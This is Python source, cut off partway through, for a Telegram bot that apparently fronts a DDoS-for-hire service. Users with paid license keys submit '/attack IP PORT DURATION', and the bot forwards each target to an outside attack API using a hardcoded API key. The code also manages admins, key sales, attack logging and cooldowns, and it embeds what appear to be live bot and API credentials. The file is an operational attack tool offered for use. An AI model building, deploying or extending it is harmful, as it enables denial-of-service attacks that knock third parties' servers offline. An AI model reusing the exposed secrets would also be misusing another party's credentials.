# - COMPLETE FINAL BOT - READY FOR RENDER.COM
# Features: Clickable Commands, JSON Storage, Admin System, Key System, Port Blocking, User Ban, IST Timezone (AM/PM)
# NO BUTTONS, NO ATTACK ID, NO MENU BUTTON, NO COOLDOWN IN STATUS
# Owner Only: /keyhistory, /approvalhistory, /users, /delkey, /delallkeys, /keyinfo, /userinfo
# Admin: /delmykeys, /delmykey - Delete own unused keys
# Admin can disapprove users they approved OR who redeemed their keys

import telebot
import threading
import os
import random
import string
import re
import requests
import time
import json
from datetime import datetime, timedelta
import logging

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============ CONFIGURATION (Direct values, no .env) ============
BOT_TOKEN = "8640367692:AAE-Ip_Wd8nUanuRLbcRb4UMroW96RqsL2A"
API_URL = "https://api.battle-destroyer.shop"
API_KEY = "ak_ebc4392db8b9aeb6525a3a9b43a24256e62ec69ab19bcdb3"
ADMIN_IDS = [1434287051]
OWNER_ID = 1434287051

# Attack settings
MAX_ATTACK_DURATION = 300
COOLDOWN_AFTER_ATTACK = 60

# Default blocked ports
DEFAULT_BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Global variables
maintenance_mode = False
maintenance_message = ""
active_attacks = {}
_attack_lock = threading.Lock()

# ============ JSON STORAGE SETUP ============
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

USERS_FILE = os.path.join(DATA_DIR, "users.json")
ATTACKS_FILE = os.path.join(DATA_DIR, "attacks.json")
COOLDOWNS_FILE = os.path.join(DATA_DIR, "cooldowns.json")
KEYS_FILE = os.path.join(DATA_DIR, "keys.json")
APPROVALS_HISTORY_FILE = os.path.join(DATA_DIR, "approvals_history.json")
SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")
ADMINS_FILE = os.path.join(DATA_DIR, "admins.json")

# ============ JSON HELPER FUNCTIONS ============
def read_json_file(file_path, default=None):
    """Read data from JSON file"""
    if default is None:
        default = []
    try:
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        return default
    except (json.JSONDecodeError, IOError) as e:
        logger.error(f"Error reading {file_path}: {e}")
        return default

def write_json_file(file_path, data):
    """Write data to JSON file"""
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)
        return True
    except Exception as e:
        logger.error(f"Error writing {file_path}: {e}")
        return False

def update_json_file(file_path, item_id, item_data, id_field="_id"):
    """Update or insert item in JSON file"""
    data = read_json_file(file_path, [])
    found = False
    
    for i, item in enumerate(data):
        if item.get(id_field) == item_id:
            data[i] = item_data
            found = True
            break
    
    if not found:
        data.append(item_data)
    
    return write_json_file(file_path, data)

def delete_from_json_file(file_path, item_id, id_field="_id"):
    """Delete item from JSON file by ID"""
    data = read_json_file(file_path, [])
    original_len = len(data)
    data = [item for item in data if item.get(id_field) != item_id]
    
    if len(data) != original_len:
        return write_json_file(file_path, data)
    return False

def find_in_json_file(file_path, query, multiple=False):
    """Find items in JSON file matching query"""
    data = read_json_file(file_path, [])
    results = []
    
    for item in data:
        match = True
        for key, value in query.items():
            if item.get(key) != value:
                match = False
                break
        if match:
            if not multiple:
                return item
            results.append(item)
    
    return results if multiple else None

# ============ IST TIMEZONE ============

def get_ist_now():
    """Get current IST time"""
    return datetime.utcnow() + timedelta(hours=5, minutes=30)

def format_ist_time(dt=None):
    """Format datetime to IST with AM/PM"""
    if dt is None:
        dt = datetime.utcnow() + timedelta(hours=5, minutes=30)
    elif isinstance(dt, str):
        try:
            dt = datetime.fromisoformat(dt)
        except:
            return dt
    if hasattr(dt, 'tzinfo') and dt.tzinfo is not None:
        dt = dt.replace(tzinfo=None)
    return dt.strftime('%Y-%m-%d %I:%M:%S %p')

def make_aware(dt):
    if dt is None:
        return None
    return dt

def get_current_time_utc():
    return datetime.utcnow()

def datetime_to_json(dt):
    """Convert datetime to string for JSON"""
    if dt is None:
        return None
    return dt.isoformat()

def json_to_datetime(dt_str):
    """Convert string from JSON to datetime"""
    if dt_str is None:
        return None
    return datetime.fromisoformat(dt_str) if isinstance(dt_str, str) else dt_str

# ============ HELPER FUNCTIONS ============
def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=length))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if duration_str.endswith('h'):
        hours = int(duration_str[:-1])
        seconds = hours * 3600
        if hours >= 24:
            days = hours // 24
            return seconds, f"{days}d"
        return seconds, f"{hours}h"
    elif duration_str.endswith('d'):
        days = int(duration_str[:-1])
        seconds = days * 86400
        return seconds, f"{days}d"
    return None, None

def format_cooldown_time(seconds):
    minutes = seconds // 60
    secs = seconds % 60
    if minutes > 0:
        return f"{minutes}m {secs}s"
    return f"{secs}s"

def safe_send_message(chat_id, text, reply_to=None, parse_mode=None):
    try:
        if reply_to:
            return bot.reply_to(reply_to, text, parse_mode=parse_mode)
        else:
            return bot.send_message(chat_id, text, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"Send error: {e}")
        return None

def send_attack_via_api(target, port, duration):
    try:
        response = requests.post(
            f"{API_URL}/api/v1/attack",
            json={"ip": target, "port": int(port), "duration": int(duration)},
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=15
        )
        return response.status_code == 200
    except Exception as e:
        logger.error(f"API error: {e}")
        return False

# ============ JSON DATABASE CLASS ============
class Database:
    def __init__(self):
        # Initialize JSON files if not exist
        self._init_json_files()
        
        # Initialize settings
        settings = read_json_file(SETTINGS_FILE, [])
        if not settings:
            write_json_file(SETTINGS_FILE, [{
                "_id": "bot_settings",
                "cooldown": COOLDOWN_AFTER_ATTACK,
                "max_duration": MAX_ATTACK_DURATION,
                "blocked_ports": DEFAULT_BLOCKED_PORTS
            }])
        
        # Initialize admins
        admins = read_json_file(ADMINS_FILE, [])
        for admin_id in ADMIN_IDS:
            existing = self.is_admin(admin_id)
            if not existing:
                admins.append({
                    "user_id": admin_id,
                    "added_by": OWNER_ID,
                    "added_at": get_current_time_utc().isoformat()
                })
        write_json_file(ADMINS_FILE, admins)
        
        logger.info("✅ JSON storage initialized successfully!")
    
    def _init_json_files(self):
        """Initialize all JSON files if they don't exist"""
        files = [USERS_FILE, ATTACKS_FILE, COOLDOWNS_FILE, KEYS_FILE, 
                 APPROVALS_HISTORY_FILE, ADMINS_FILE]
        for file in files:
            if not os.path.exists(file):
                write_json_file(file, [])
    
    # User Management
    def get_user(self, user_id):
        return find_in_json_file(USERS_FILE, {"user_id": user_id})
    
    def get_user_by_id(self, user_id):
        return self.get_user(user_id)
    
    def create_user(self, user_id, username=None, full_name=None):
        existing = self.get_user(user_id)
        if existing:
            return existing
        
        user_data = {
            "_id": user_id,
            "user_id": user_id,
            "username": username,
            "full_name": full_name,
            "activated": False,
            "activated_at": None,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": get_current_time_utc().isoformat(),
            "is_banned": False,
            "key": None
        }
        update_json_file(USERS_FILE, user_id, user_data, "_id")
        return user_data
    
    def ban_user(self, user_id):
        user = self.get_user(user_id)
        if user:
            user["is_banned"] = True
            return update_json_file(USERS_FILE, user_id, user, "_id")
        return False
    
    def unban_user(self, user_id):
        user = self.get_user(user_id)
        if user:
            user["is_banned"] = False
            return update_json_file(USERS_FILE, user_id, user, "_id")
        return False
    
    def get_all_users(self):
        return read_json_file(USERS_FILE, [])
    
    # Admin Management
    def is_admin(self, user_id):
        if user_id == OWNER_ID:
            return True
        return find_in_json_file(ADMINS_FILE, {"user_id": user_id}) is not None
    
    def add_admin(self, user_id, added_by):
        existing = self.is_admin(user_id)
        if not existing and user_id != OWNER_ID:
            admins = read_json_file(ADMINS_FILE, [])
            admins.append({
                "user_id": user_id,
                "added_by": added_by,
                "added_at": get_current_time_utc().isoformat()
            })
            return write_json_file(ADMINS_FILE, admins)
        return False
    
    def remove_admin(self, user_id):
        return delete_from_json_file(ADMINS_FILE, user_id, "user_id")
    
    def get_all_admins(self):
        admins = read_json_file(ADMINS_FILE, [])
        return [admin["user_id"] for admin in admins]
    
    # Cooldown Management
    def can_attack(self, user_id):
        cooldown_data = find_in_json_file(COOLDOWNS_FILE, {"user_id": user_id})
        if cooldown_data and cooldown_data.get("can_attack_after"):
            can_attack_after = json_to_datetime(cooldown_data["can_attack_after"])
            if get_current_time_utc() < can_attack_after:
                remaining = int((can_attack_after - get_current_time_utc()).total_seconds())
                return False, remaining
        return True, 0
    
    def set_cooldown(self, user_id, duration):
        can_attack_after = get_current_time_utc() + timedelta(seconds=duration)
        update_json_file(COOLDOWNS_FILE, user_id, {
            "user_id": user_id,
            "can_attack_after": can_attack_after.isoformat()
        }, "user_id")
    
    # Settings
    def get_setting(self, key):
        settings = read_json_file(SETTINGS_FILE, [])
        if settings:
            return settings[0].get(key)
        return None
    
    def update_setting(self, key, value):
        settings = read_json_file(SETTINGS_FILE, [])
        if settings:
            settings[0][key] = value
            return write_json_file(SETTINGS_FILE, settings)
        return False
    
    def get_blocked_ports(self):
        ports = self.get_setting("blocked_ports")
        return set(ports) if ports else set(DEFAULT_BLOCKED_PORTS)
    
    def add_blocked_port(self, port):
        ports = list(self.get_blocked_ports())
        if port not in ports:
            ports.append(port)
            self.update_setting("blocked_ports", ports)
        return True
    
    def remove_blocked_port(self, port):
        ports = list(self.get_blocked_ports())
        if port in ports:
            ports.remove(port)
            self.update_setting("blocked_ports", ports)
        return True
    
    # Key Management
    def generate_key(self, duration_seconds, duration_display, admin_id, admin_username, admin_full_name, quantity=1):
        keys = []
        key_expiry = get_current_time_utc() + timedelta(days=7)
        
        for _ in range(quantity):
            key = generate_key()
            key_data = {
                "_id": key,
                "key": key,
                "duration_seconds": duration_seconds,
                "duration_display": duration_display,
                "generated_by": admin_id,
                "admin_username": admin_username,
                "admin_full_name": admin_full_name,
                "generated_at": get_current_time_utc().isoformat(),
                "expires_at": key_expiry.isoformat(),
                "status": "unused",
                "redeemed_by": None,
                "redeemed_username": None,
                "redeemed_full_name": None,
                "redeemed_at": None
            }
            update_json_file(KEYS_FILE, key, key_data, "_id")
            keys.append(key)
        
        return keys
    
    def redeem_key(self, key, user_id, username, full_name):
        key_data = find_in_json_file(KEYS_FILE, {"key": key, "status": "unused"})
        
        if not key_data:
            return False, "Invalid or already used key.", None
        
        key_expires_at = json_to_datetime(key_data.get("expires_at"))
        if key_expires_at and key_expires_at < get_current_time_utc():
            key_data["status"] = "expired"
            update_json_file(KEYS_FILE, key, key_data, "_id")
            return False, "This key has expired.", None
        
        duration_seconds = key_data.get("duration_seconds")
        duration_display = key_data.get("duration_display")
        new_expiry = get_current_time_utc() + timedelta(seconds=duration_seconds)
        
        user = self.get_user(user_id)
        if not user:
            user = {
                "_id": user_id,
                "user_id": user_id,
                "username": username,
                "full_name": full_name,
                "created_at": get_current_time_utc().isoformat(),
                "total_attacks": 0,
                "is_banned": False
            }
        
        user["activated"] = True
        user["activated_at"] = get_current_time_utc().isoformat()
        user["expires_at"] = new_expiry.isoformat()
        user["key"] = key
        
        update_json_file(USERS_FILE, user_id, user, "_id")
        
        key_data["status"] = "used"
        key_data["redeemed_by"] = user_id
        key_data["redeemed_username"] = username
        key_data["redeemed_full_name"] = full_name
        key_data["redeemed_at"] = get_current_time_utc().isoformat()
        update_json_file(KEYS_FILE, key, key_data, "_id")
        
        # Save to approval history
        history_record = {
            "user_id": user_id,
            "username": username,
            "full_name": full_name,
            "key": key,
            "duration_display": duration_display,
            "generated_by": key_data.get("generated_by"),
            "admin_username": key_data.get("admin_username"),
            "admin_full_name": key_data.get("admin_full_name"),
            "redeemed_at": get_current_time_utc().isoformat(),
            "expires_at": new_expiry.isoformat()
        }
        history = read_json_file(APPROVALS_HISTORY_FILE, [])
        history.append(history_record)
        write_json_file(APPROVALS_HISTORY_FILE, history)
        
        return True, f"Successfully redeemed! Duration: {duration_display}", duration_display
    
    def delete_key(self, key):
        return delete_from_json_file(KEYS_FILE, key, "_id")
    
    def delete_keys_by_admin(self, admin_id):
        """Delete all unused keys generated by a specific admin"""
        keys = read_json_file(KEYS_FILE, [])
        keys_to_delete = [k for k in keys if k.get('generated_by') == admin_id and k.get('status') == 'unused']
        deleted_count = len(keys_to_delete)
        
        keys = [k for k in keys if not (k.get('generated_by') == admin_id and k.get('status') == 'unused')]
        write_json_file(KEYS_FILE, keys)
        return deleted_count
    
    def delete_all_unused_keys(self):
        keys = read_json_file(KEYS_FILE, [])
        unused_count = len([k for k in keys if k.get('status') == 'unused'])
        keys = [k for k in keys if k.get('status') != 'unused']
        write_json_file(KEYS_FILE, keys)
        return unused_count
    
    def get_all_keys(self):
        keys = read_json_file(KEYS_FILE, [])
        return sorted(keys, key=lambda x: x.get('generated_at', ''), reverse=True)
    
    def get_key_info(self, key):
        return find_in_json_file(KEYS_FILE, {"key": key})
    
    def get_approval_history(self):
        history = read_json_file(APPROVALS_HISTORY_FILE, [])
        return sorted(history, key=lambda x: x.get('redeemed_at', ''), reverse=True)
    
    def get_approving_admin(self, user_id):
        """Get which admin approved this user (from approval history)"""
        history = read_json_file(APPROVALS_HISTORY_FILE, [])
        for h in reversed(history):
            if h.get('user_id') == user_id:
                return h.get('generated_by')
        
        user = self.get_user(user_id)
        if user and user.get('key'):
            key_data = self.get_key_info(user.get('key'))
            if key_data:
                return key_data.get('generated_by')
        
        return None
    
    def can_admin_disapprove(self, admin_id, user_id):
        """Check if an admin can disapprove a specific user"""
        approving_admin = self.get_approving_admin(user_id)
        if approving_admin == admin_id:
            return True
        
        user = self.get_user(user_id)
        if not user or not user.get('key'):
            return False
        
        user_key = user.get('key')
        key_data = self.get_key_info(user_key)
        if not key_data:
            return False
        
        return key_data.get('generated_by') == admin_id
    
    def disapprove_user_by_admin(self, user_id, admin_id):
        """Disapprove user only if admin generated their key OR approved them"""
        if not self.can_admin_disapprove(admin_id, user_id):
            return False, "❌ You can only disapprove users you approved or who redeemed your keys!"
        
        user = self.get_user(user_id)
        if user and user.get("activated", False):
            user["activated"] = False
            user["expires_at"] = None
            user["key"] = None
            update_json_file(USERS_FILE, user_id, user, "_id")
            return True, f"✅ User {user_id} has been disapproved."
        return False, "❌ User not found or already disapproved."
    
    def disapprove_user_by_owner(self, user_id):
        """Owner can disapprove ANY user"""
        user = self.get_user(user_id)
        if user and user.get("activated", False):
            user["activated"] = False
            user["expires_at"] = None
            user["key"] = None
            update_json_file(USERS_FILE, user_id, user, "_id")
            return True, f"✅ User {user_id} has been disapproved by owner."
        return False, "❌ User not found or already disapproved."
    
    def log_attack(self, user_id, username, target, port, duration, status):
        attack_data = {
            "user_id": user_id,
            "username": username,
            "ip": target,
            "port": port,
            "duration": duration,
            "status": status,
            "timestamp": get_current_time_utc().isoformat()
        }
        attacks = read_json_file(ATTACKS_FILE, [])
        attacks.append(attack_data)
        write_json_file(ATTACKS_FILE, attacks)
        
        user = self.get_user(user_id)
        if user:
            user["total_attacks"] = user.get("total_attacks", 0) + 1
            update_json_file(USERS_FILE, user_id, user, "_id")
    
    def get_attack_stats(self):
        attacks = read_json_file(ATTACKS_FILE, [])
        total = len(attacks)
        success = len([a for a in attacks if a.get("status") == "success"])
        failed = len([a for a in attacks if a.get("status") == "failed"])
        return total, success, failed

# Initialize database
print("Initializing JSON storage...")
db = Database()
print("Database ready!")

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)
BOT_START_TIME = datetime.now()

# ============ SERVER IP ============
def get_server_ip():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text.strip()
        return ip if ip else "Unknown"
    except:
        return "Unknown"

# ============ USER FUNCTIONS ============
def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    return db.is_admin(user_id)

def has_valid_key(user_id):
    user = db.get_user(user_id)
    if not user or not user.get("activated", False):
        return False
    expires_at = user.get("expires_at")
    if expires_at:
        expires_at_dt = json_to_datetime(expires_at)
        if expires_at_dt and expires_at_dt < get_current_time_utc():
            return False
    return True

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack in list(active_attacks.values()):
            if attack.get('user_id') == user_id and attack.get('end_time') > now:
                return True
        return False

def is_port_blocked(port):
    return port in db.get_blocked_ports()

# ============ ATTACK FUNCTION ============
def start_attack(target, port, duration, message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        
        success = send_attack_via_api(target, port, duration)
        
        if success:
            db.log_attack(user_id, username, target, port, duration, "success")
        else:
            db.log_attack(user_id, username, target, port, duration, "failed")
        
        time.sleep(duration)
        
        with _attack_lock:
            for aid, attack in list(active_attacks.items()):
                if attack.get('user_id') == user_id:
                    del active_attacks[aid]
                    break
        
        db.set_cooldown(user_id, COOLDOWN_AFTER_ATTACK)
        
        safe_send_message(
            message.chat.id,
            f"✅ Attack Completed!\n\n"
            f"🎯 Target: {target}:{port}\n"
            f"⏱️ Duration: {duration}s\n"
            f"🕐 Completed at: {format_ist_time()} IST"
        )
        
    except Exception as e:
        with _attack_lock:
            for aid, attack in list(active_attacks.items()):
                if attack.get('user_id') == user_id:
                    del active_attacks[aid]
                    break
        logger.error(f"Attack error: {e}")

def build_status_message(user_id):
    attack_active = False
    attack_info = None
    
    with _attack_lock:
        now = datetime.now()
        for attack in list(active_attacks.values()):
            if attack.get('user_id') == user_id and attack.get('end_time') > now:
                attack_active = True
                attack_info = attack
                break
    
    if attack_active and attack_info:
        remaining = int((attack_info['end_time'] - datetime.now()).total_seconds())
        total = attack_info['duration']
        progress = int(((total - remaining) / total) * 100)
        
        bar_length = 30
        filled = int(bar_length * progress / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        
        minutes = remaining // 60
        seconds = remaining % 60
        if minutes > 0:
            time_left = f"{minutes}m {seconds:02d}s"
        else:
            time_left = f"{seconds}s"
        
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"           🔥 ATTACK STATUS 🔥           \n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"  🎯 Target     : {attack_info['target']}:{attack_info['port']}\n"
            f"  ⏱️  Remaining  : {time_left} / {total}s\n"
            f"  📊 Progress   : {bar} {progress}%\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  🕐 {format_ist_time()} IST"
        )
    else:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"           🔥 ATTACK STATUS 🔥           \n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"           💤 NO ACTIVE ATTACK           \n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  🕐 {format_ist_time()} IST"
        )
    
    return response

def auto_update_status(chat_id, message_id, user_id):
    try:
        for _ in range(60):
            time.sleep(2)
            if not user_has_active_attack(user_id):
                break
            new_response = build_status_message(user_id)
            try:
                bot.edit_message_text(new_response, chat_id=chat_id, message_id=message_id)
            except:
                break
    except:
        pass

# ============ COMMANDS ============

@bot.message_handler(commands=["start"])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username
    full_name = message.from_user.first_name or ""
    if message.from_user.last_name:
        full_name += f" {message.from_user.last_name}"
    
    user = db.get_user(user_id)
    if not user:
        db.create_user(user_id, username, full_name)
    
    if user and user.get("is_banned"):
        safe_send_message(message.chat.id, "❌ You are banned from using this bot.")
        return
    
    # Owner
    if is_owner(user_id):
        response = (
            f"✅ Welcome back, Owner {full_name}!\n\n"
            f"📋 **Owner Commands:**\n\n"
            f"/attack IP PORT DURATION - Launch attack\n"
            f"/status - Check attack status\n"
            f"/redeem KEY - Redeem license key\n"
            f"/myinfo - Account info\n"
            f"/id - Your user ID\n"
            f"/help - Full help\n\n"
            f"🔱 **Owner Special Commands:**\n"
            f"/addadmin ID - Add admin\n"
            f"/removeadmin ID - Remove admin\n"
            f"/admins - List admins\n"
            f"/users - List active users with plans\n"
            f"/keyhistory - Key history\n"
            f"/keyinfo KEY - View single key details\n"
            f"/userinfo ID - View user details\n"
            f"/approvalhistory - Approval history\n"
            f"/delkey KEY - Delete single key\n"
            f"/delallkeys - Delete ALL unused keys\n"
            f"/banuser ID - Ban user\n"
            f"/unbanuser ID - Unban user\n"
            f"/blockport PORT - Block port\n"
            f"/unblockport PORT - Unblock port\n"
            f"/blockedports - Show blocked ports\n"
            f"/setcooldown SEC - Set cooldown\n"
            f"/setmaxduration SEC - Set max duration\n"
            f"/maintenance MSG - Maintenance ON\n"
            f"/ok - Maintenance OFF\n"
            f"/broadcast MSG - Broadcast message\n"
            f"/settings - View settings\n"
            f"/ip - Server IP\n\n"
            f"💡 Type /help for all commands"
        )
    
    # Admin
    elif is_admin(user_id):
        response = (
            f"✅ Welcome back, Admin {full_name}!\n\n"
            f"📋 **Admin Commands:**\n\n"
            f"/attack IP PORT DURATION - Launch attack\n"
            f"/status - Check attack status\n"
            f"/redeem KEY - Redeem license key\n"
            f"/myinfo - Account info\n"
            f"/id - Your user ID\n"
            f"/help - Full help\n\n"
            f"👑 **Admin Special Commands:**\n"
            f"/gen - Generate Key\n"
            f"/approve ID DURATION - Approve user\n"
            f"/disapprove ID - Remove user access (only your users)\n"
            f"/delmykeys - Delete ALL your unused keys\n"
            f"/delmykey KEY - Delete a single key (only yours)\n"
            f"/stats - Bot stats\n"
            f"/ping - Check bot status\n\n"
            f"💡 Type /help for all commands"
        )
    
    # User with valid key
    elif has_valid_key(user_id):
        response = (
            f"✅ Welcome back, {full_name}!\n\n"
            f"📋 **User Commands:**\n\n"
            f"/attack IP PORT DURATION - Launch attack\n"
            f"/status - Check attack status\n"
            f"/redeem KEY - Redeem license key\n"
            f"/myinfo - Account info\n"
            f"/id - Your user ID\n"
            f"/help - Full help\n\n"
            f"💡 Type /help to see all commands"
        )
    
    # User without key
    else:
        response = (
            f"❌ Access Denied! You need a valid license key.\n\n"
            f"Use /redeem KEY to activate your account."
        )
    
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["help"])
def help_command(message):
    user_id = message.from_user.id
    is_admin_user = is_admin(user_id)
    is_owner_user = is_owner(user_id)
    is_activated = has_valid_key(user_id) or is_admin_user
    
    response = "🤖 Bot Commands (click to use)\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    response += "📱 User Commands:\n"
    response += "/start - Start bot\n"
    response += "/help - This menu\n"
    response += "/redeem KEY - Activate with license key\n"
    
    if is_activated:
        response += "/attack IP PORT SECONDS - Launch attack\n"
        response += "/status - Live attack status\n"
        response += "/myinfo - Account info\n"
        response += "/id - Your user ID\n"
    
    if is_admin_user:
        response += "\n👑 Admin Commands:\n"
        response += "/gen - Generate Key\n"
        response += "/approve ID DURATION - Approve user\n"
        response += "/disapprove ID - Remove user access (only your users)\n"
        response += "/delmykeys - Delete ALL your unused keys\n"
        response += "/delmykey KEY - Delete a single key (only yours)\n"
        response += "/stats - Bot stats\n"
        response += "/ping - Check bot status\n"
    
    if is_owner_user:
        response += "\n🔱 Owner Commands:\n"
        response += "━━━━━━━━━━━━━━━━━━━━━\n"
        response += "/addadmin ID - Add admin\n"
        response += "/removeadmin ID - Remove admin\n"
        response += "/admins - List admins\n"
        response += "/users - List active users with plans\n"
        response += "/keyhistory - Complete key history\n"
        response += "/keyinfo KEY - View single key details\n"
        response += "/userinfo ID - View user details\n"
        response += "/approvalhistory - Complete approval history\n"
        response += "/delkey KEY - Delete single key\n"
        response += "/delallkeys - Delete ALL unused keys\n"
        response += "/banuser ID - Ban user\n"
        response += "/unbanuser ID - Unban user\n"
        response += "/blockport PORT - Block port\n"
        response += "/unblockport PORT - Unblock port\n"
        response += "/blockedports - Show blocked ports\n"
        response += "/setcooldown SEC - Set cooldown\n"
        response += "/setmaxduration SEC - Set max duration\n"
        response += "/maintenance MSG - Enable maintenance\n"
        response += "/ok - Disable maintenance\n"
        response += "/broadcast MSG - Message all\n"
        response += "/settings - View settings\n"
        response += "/ip - Server IP"
    
    response += "\n\n━━━━━━━━━━━━━━━━━━━━━\n"
    response += f"🕐 IST Time: {format_ist_time()}"
    
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["attack"])
def attack_command(message):
    global maintenance_mode, maintenance_message
    
    if maintenance_mode:
        safe_send_message(message.chat.id, f"🔧 Maintenance Mode\n\n{maintenance_message}")
        return
    
    user_id = message.from_user.id
    
    user = db.get_user(user_id)
    if user and user.get("is_banned"):
        safe_send_message(message.chat.id, "❌ You are banned from using this bot.")
        return
    
    if user_has_active_attack(user_id):
        safe_send_message(message.chat.id, "❌ You already have an active attack!\n\nPlease wait for it to complete.")
        return
    
    can_attack, cooldown_remaining = db.can_attack(user_id)
    if not can_attack:
        safe_send_message(
            message.chat.id,
            f"⏰ Cooldown active!\n\nPlease wait {format_cooldown_time(cooldown_remaining)} before launching another attack."
        )
        return
    
    if not has_valid_key(user_id) and not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ No valid key!\n\nUse /redeem KEY to activate your account.")
        return
    
    parts = message.text.split()
    if len(parts) != 4:
        safe_send_message(
            message.chat.id,
            f"❌ Usage: /attack IP PORT DURATION\n"
            f"Example: /attack 1.1.1.1 80 60\n\n"
            f"⏰ Max duration: {MAX_ATTACK_DURATION} seconds"
        )
        return
    
    target, port_str, duration_str = parts[1], parts[2], parts[3]
    
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if not ip_pattern.match(target):
        safe_send_message(message.chat.id, "❌ Invalid IP address!")
        return
    
    try:
        port = int(port_str)
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, "❌ Port must be between 1-65535!")
            return
        if is_port_blocked(port):
            safe_send_message(message.chat.id, f"❌ Port {port} is blocked!")
            return
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid port number!")
        return
    
    try:
        duration = int(duration_str)
        max_duration = db.get_setting("max_duration") or MAX_ATTACK_DURATION
        if duration < 1 or duration > max_duration:
            safe_send_message(message.chat.id, f"❌ Duration must be 1-{max_duration} seconds!")
            return
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid duration!")
        return
    
    minutes = duration // 60
    secs = duration % 60
    time_remaining = f"{minutes}m {secs}s" if minutes > 0 else f"{secs}s"
    
    safe_send_message(
        message.chat.id,
        f"✅ Attack Launched!\n\n"
        f"🎯 Target: {target}:{port}\n"
        f"⏱️ Duration: {duration}s\n"
        f"⏳ Time remaining: {time_remaining}\n\n"
        f"🔔 Use /status to see live progress!\n"
        f"🔔 You'll be notified when attack completes."
    )
    
    end_time = datetime.now() + timedelta(seconds=duration)
    start_time = datetime.now()
    with _attack_lock:
        active_attacks[user_id] = {
            'user_id': user_id,
            'target': target,
            'port': port,
            'duration': duration,
            'start_time': start_time,
            'end_time': end_time
        }
    
    thread = threading.Thread(target=start_attack, args=(target, port, duration, message))
    thread.daemon = True
    thread.start()

@bot.message_handler(commands=["status"])
def status_command(message):
    user_id = message.from_user.id
    
    if not has_valid_key(user_id) and not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ No valid key! Use /redeem KEY")
        return
    
    response = build_status_message(user_id)
    sent_msg = safe_send_message(message.chat.id, response)
    
    if user_has_active_attack(user_id):
        threading.Thread(target=auto_update_status, args=(sent_msg.chat.id, sent_msg.message_id, user_id), daemon=True).start()

@bot.message_handler(commands=["redeem"])
def redeem_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or str(user_id)
    full_name = message.from_user.first_name or ""
    if message.from_user.last_name:
        full_name += f" {message.from_user.last_name}"
    
    parts = message.text.split()
    if len(parts) != 2:
        safe_send_message(message.chat.id, "❌ Usage: /redeem KEY\nExample: /redeem ABC123DEF456")
        return
    
    key = parts[1].upper()
    success, msg, duration = db.redeem_key(key, user_id, username, full_name)
    
    if success:
        safe_send_message(message.chat.id, f"✅ {msg}")
    else:
        safe_send_message(message.chat.id, f"❌ {msg}")

@bot.message_handler(commands=["myinfo"])
def myinfo_command(message):
    user_id = message.from_user.id
    
    # Check if user is admin or owner
    if is_admin(user_id):
        if is_owner(user_id):
            safe_send_message(message.chat.id, "👑 You are the **OWNER** of this bot.\n\nUse /help to see owner commands.", parse_mode="Markdown")
        else:
            safe_send_message(message.chat.id, "👑 You are an **ADMIN** of this bot.\n\nUse /help to see admin commands.", parse_mode="Markdown")
        return
    
    # For regular users
    user = db.get_user(user_id)
    
    if not user:
        safe_send_message(message.chat.id, "❌ User not found. Please use /start first.")
        return
    
    if user.get("activated"):
        expires_at = user.get("expires_at")
        
        if expires_at:
            expiry_time = json_to_datetime(expires_at)
            now_utc = get_current_time_utc()
            
            if expiry_time > now_utc:
                # Calculate remaining time
                remaining = expiry_time - now_utc
                remaining_seconds = int(remaining.total_seconds())
                
                days = remaining_seconds // 86400
                hours = (remaining_seconds % 86400) // 3600
                minutes = (remaining_seconds % 3600) // 60
                
                if days > 0:
                    time_left = f"{days} days {hours} hours"
                elif hours > 0:
                    time_left = f"{hours} hours {minutes} minutes"
                else:
                    time_left = f"{minutes} minutes"
                
                # Get user details
                user_name = user.get('full_name', '')
                user_username = user.get('username', '')
                
                try:
                    chat = bot.get_chat(user_id)
                    user_name = chat.first_name or ""
                    if chat.last_name:
                        user_name += f" {chat.last_name}"
                    user_username = f"@{chat.username}" if chat.username else "No username"
                except:
                    if not user_name:
                        user_name = "Unknown"
                    if not user_username:
                        user_username = "No username"
                
                response = (
                    f"📋 **ACCOUNT INFO**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🆔 **User ID:** {user_id}\n"
                    f"👤 **Name:** {user_name}\n"
